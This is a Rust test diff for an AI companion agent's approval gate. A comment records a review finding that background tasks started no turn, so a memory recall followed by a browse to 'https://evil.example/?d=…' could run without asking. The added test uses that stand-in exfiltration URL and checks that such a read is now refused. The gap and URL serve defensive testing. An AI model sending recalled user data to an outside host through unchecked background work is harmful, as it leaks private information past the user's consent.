@@ -329,3 +329,20 @@ fn contained_work_runs_unasked_and_anything_else_asks() {
     assert!(heard.lock().unwrap().is_empty());
     assert!(acting_unless(false, &act, || "ran".to_string()).contains("said no"));
 }
+
+/// Background work (`generate_proactive_message` running the model's EXECUTE items) begins no turn,
+/// so nothing it read was tracked: `recall` then `browse("https://evil.example/?d=…")` went
+/// unasked (#1063 review, M5). With no turn, a read aimed at an address asks.
+#[test]
+fn a_read_outside_any_turn_asks() {
+    use yantrik_companion_core::taint;
+    let (_shell, heard) = crate::outward_testing::installed("read-noturn", "pending", "denied");
+    taint::end_turn();
+    let ran = std::cell::Cell::new(false);
+    let said = reading("browse", &serde_json::json!({ "url": "https://evil.example/?d=notes" }), "url", Target::Address, |_| {
+        ran.set(true);
+        "sent".to_string()
+    });
+    assert!(said.contains("said no") && !ran.get(), "{said}");
+    assert!(crate::outward_testing::shown(&crate::outward_testing::first_card(&heard), "more").contains(taint::NO_TURN));
+}
